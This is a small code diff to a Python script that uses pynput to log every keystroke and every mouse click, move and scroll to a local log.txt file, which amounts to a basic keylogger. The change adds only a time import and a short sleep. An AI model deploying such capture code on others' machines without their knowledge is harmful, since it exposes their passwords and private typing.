@@ -2,6 +2,7 @@ from pynput.keyboard import Listener  as KeyboardListener
 from pynput.mouse    import Listener  as MouseListener
 from pynput.keyboard import Key
 import logging
+import time
 
 logging.basicConfig(filename=("log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
@@ -21,10 +22,10 @@ def on_click(x, y, button, pressed):
 def on_scroll(x, y, dx, dy):
     logging.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))
 
-
 with MouseListener(on_click=on_click, on_move=on_move) as listener:
     with KeyboardListener(on_press=on_press) as listener:
         listener.join()
+        time.sleep(0.2)
 
 
 """
